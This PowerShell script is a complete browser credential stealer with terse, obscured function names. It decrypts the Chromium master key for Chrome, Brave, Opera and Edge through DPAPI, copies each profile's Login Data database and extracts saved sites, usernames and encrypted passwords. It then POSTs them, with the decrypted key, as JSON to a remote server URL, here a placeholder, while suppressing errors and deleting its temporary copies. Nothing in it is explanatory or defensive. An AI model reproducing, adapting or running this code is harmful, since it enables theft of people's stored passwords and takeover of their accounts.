function G-BC {
    param([Parameter(Mandatory = $true)][String]$u)
    $ErrorActionPreference = 'SilentlyContinue'
    $script:a = @()
    $script:f = $false
    $t = "DEFAULT_TOKEN_VALUE"

    function P-B {
        param($n, $p, $l)
        try {
            if (-not(Test-Path $p) -or -not(Test-Path $l)) { return }
            Add-Type -AssemblyName System.Security
            $q = "SELECT origin_url,username_value,password_value FROM logins WHERE blacklisted_by_user=0"
            $s = Get-Content -Raw -Path $l | ConvertFrom-Json
            $k = $s.os_crypt.encrypted_key
            $c = [Convert]::FromBase64String($k)
            $m = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($c[5..$c.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
            if (-not([System.Management.Automation.PSTypeName]'WinSQLite3').Type) {
                Add-Type @"
using System;using System.Runtime.InteropServices;
public class WinSQLite3{
const string dll="winsqlite3";
[DllImport(dll,EntryPoint="sqlite3_open")]
public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)]string filename,out IntPtr db);
[DllImport(dll,EntryPoint="sqlite3_prepare16_v2")]
public static extern IntPtr Prepare2(IntPtr db,[MarshalAs(UnmanagedType.LPWStr)]string sql,int numBytes,out IntPtr stmt,IntPtr pzTail);
[DllImport(dll,EntryPoint="sqlite3_step")]
public static extern IntPtr Step(IntPtr stmt);
[DllImport(dll,EntryPoint="sqlite3_column_text16")]
static extern IntPtr ColumnText16(IntPtr stmt,int index);
[DllImport(dll,EntryPoint="sqlite3_column_bytes")]
static extern int ColumnBytes(IntPtr stmt,int index);
[DllImport(dll,EntryPoint="sqlite3_column_blob")]
static extern IntPtr ColumnBlob(IntPtr stmt,int index);
public static string ColumnString(IntPtr stmt,int index){return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt,index));}
public static byte[] ColumnByteArray(IntPtr stmt,int index){
int length=ColumnBytes(stmt,index);
byte[] result=new byte[length];
if(length>0)Marshal.Copy(ColumnBlob(stmt,index),result,0,length);
return result;}
[DllImport(dll,EntryPoint="sqlite3_errmsg16")]
public static extern IntPtr Errmsg(IntPtr db);
public static string GetErrmsg(IntPtr db){return Marshal.PtrToStringUni(Errmsg(db));}
[DllImport(dll,EntryPoint="sqlite3_finalize")]
public static extern IntPtr Finalize(IntPtr stmt);
[DllImport(dll,EntryPoint="sqlite3_close")]
public static extern IntPtr Close(IntPtr db);
}
"@ | Out-Null
            }
            $ps = Get-ChildItem -Path $p | Where-Object { $_.Name -match "(Profile [0-9]|Default)" } | ForEach-Object { $_.FullName }
            foreach ($pf in $ps) {
                $pn = Split-Path $pf -Leaf
                $od = Join-Path $pf "Login Data"
                if (-not(Test-Path $od)) { continue }
                $tp = [System.IO.Path]::GetTempPath()
                $td = Join-Path $tp "t_$n`_$pn`_ld.db"
                try {
                    Copy-Item -Path $od -Destination $td -Force | Out-Null
                    $db = 0
                    $null = [WinSQLite3]::Open($td, [ref]$db)
                    if ($db -eq 0) { continue }
                    $st = 0
                    $null = [WinSQLite3]::Prepare2($db, $q, -1, [ref]$st, [System.IntPtr]0)
                    if ($st -eq 0) { $null = [WinSQLite3]::Close($db); continue }
                    while ([WinSQLite3]::Step($st) -eq 100) {
                        $ul = [WinSQLite3]::ColumnString($st, 0)
                        $un = [WinSQLite3]::ColumnString($st, 1)
                        $ep = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($st, 2))
                        $cr = @{
                            browser            = $n;
                            profile            = $pn;
                            url                = $ul;
                            username           = $un;
                            encrypted_password = $ep;
                            key                = $m
                        }
                        $script:a += $cr
                        $script:f = $true
                    }
                    $null = [WinSQLite3]::Finalize($st)
                    $null = [WinSQLite3]::Close($db)
                }
                catch {}
                finally { if (Test-Path $td) { Remove-Item -Path $td -Force | Out-Null } }
            }
        }
        catch {}
    }

    $b = @(
        @{n = "chrome"; p = "$env:LOCALAPPDATA\Google\Chrome\User Data"; l = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" },
        @{n = "brave"; p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; l = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" },
        @{n = "opera"; p = "$env:APPDATA\Opera Software\Opera Stable"; l = "$env:APPDATA\Opera Software\Opera Stable\Local State" },
        @{n = "edge"; p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"; l = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" }
    )

    foreach ($i in $b) { P-B -n $i.n -p $i.p -l $i.l }

    if ($script:f) {
        try {
            $j = $script:a | ConvertTo-Json
            $h = @{
                'User-Agent' = $t
                'bypass-tunnel-reminder' = 1
                 }
            Invoke-RestMethod -Uri $u -Method Post -Body $j -ContentType "application/json" -Headers $h | Out-Null
        }
        catch {}
    }
}

G-BC -u "SERVER_URL_PLACEHOLDER" | Out-Null
exit
